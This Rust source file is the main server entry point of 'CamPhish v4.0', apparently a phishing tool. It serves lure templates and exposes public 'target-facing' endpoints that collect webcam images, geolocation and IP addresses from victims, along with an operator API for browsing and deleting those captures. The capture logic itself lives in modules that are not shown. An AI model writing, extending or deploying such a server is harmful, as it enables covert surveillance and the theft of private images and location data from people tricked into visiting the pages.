use axum::extract::State;
use axum::http::header;
use axum::response::{IntoResponse, Response};
use axum::routing::{get, post};
use axum::{Json, Router};
use serde::Serialize;
use sqlx::SqlitePool;
use std::net::SocketAddr;
use std::sync::Arc;
use tower_http::cors::{Any, CorsLayer};
use tower_http::services::ServeDir;
use tower_http::trace::TraceLayer;

mod api;
mod capture;
mod db;
mod templates;

pub struct AppState {
    pub pool: SqlitePool,
    pub data_dir: String,
    pub templates_dir: String,
}

#[derive(Serialize)]
struct HealthResponse {
    status: &'static str,
    service: &'static str,
    version: &'static str,
    timestamp: String,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    dotenvy::dotenv().ok();
    tracing_subscriber::fmt::init();

    let data_dir = std::env::var("DATA_DIR").unwrap_or_else(|_| "./data".into());
    let templates_dir = std::env::var("TEMPLATES_DIR").unwrap_or_else(|_| "./templates".into());
    let frontend_dir = std::env::var("FRONTEND_DIR").unwrap_or_else(|_| "./frontend/dist".into());
    let listen_addr = std::env::var("LISTEN_ADDR").unwrap_or_else(|_| "0.0.0.0:8080".into());
    let database_url = std::env::var("DATABASE_URL")
        .unwrap_or_else(|_| format!("sqlite://{}/camphish.db?mode=rwc", data_dir));

    std::fs::create_dir_all(format!("{}/captures", data_dir))?;
    std::fs::create_dir_all(format!("{}/locations", data_dir))?;

    let pool = db::init_pool(&database_url).await?;
    db::run_migrations(&pool).await?;

    let state = Arc::new(AppState {
        pool: pool.clone(),
        data_dir: data_dir.clone(),
        templates_dir: templates_dir.clone(),
    });

    templates::scan_and_register(&state).await?;

    let cors = CorsLayer::new().allow_origin(Any).allow_methods(Any).allow_headers(Any);

    let api_routes = Router::new()
        .route("/health", get(health))
        .route("/stats", get(api::get_stats))
        .route("/captures", get(api::list_captures).delete(api::delete_all_captures))
        .route("/captures/:id", get(api::get_capture).delete(api::delete_capture))
        .route("/captures/:id/file", get(api::serve_capture_file))
        .route("/locations", get(api::list_locations))
        .route("/ips", get(api::list_ips))
        .route("/templates", get(api::list_templates))
        .route("/sessions", get(api::list_sessions).post(api::create_session))
        .route("/sessions/:id", get(api::get_session).delete(api::delete_session))
        // Public capture endpoints (target-facing)
        .route("/capture/image", post(capture::receive_image))
        .route("/capture/location", post(capture::receive_location))
        .route("/capture/ip", post(capture::receive_ip));

    let app = Router::new()
        .route("/t/:template_id", get(templates::serve_template))
        .nest("/api", api_routes)
        .fallback_service(ServeDir::new(&frontend_dir).append_index_html_on_directories(true))
        .layer(cors)
        .layer(TraceLayer::new_for_http())
        .with_state(state);

    let addr: SocketAddr = listen_addr.parse()?;
    tracing::info!("CamPhish v4.0 listening on http://{}", addr);
    let listener = tokio::net::TcpListener::bind(addr).await?;
    axum::serve(listener, app).await?;

    Ok(())
}

async fn health(State(_state): State<Arc<AppState>>) -> Json<HealthResponse> {
    Json(HealthResponse {
        status: "ok",
        service: "camphish",
        version: "4.0.0",
        timestamp: chrono::Utc::now().to_rfc3339(),
    })
}
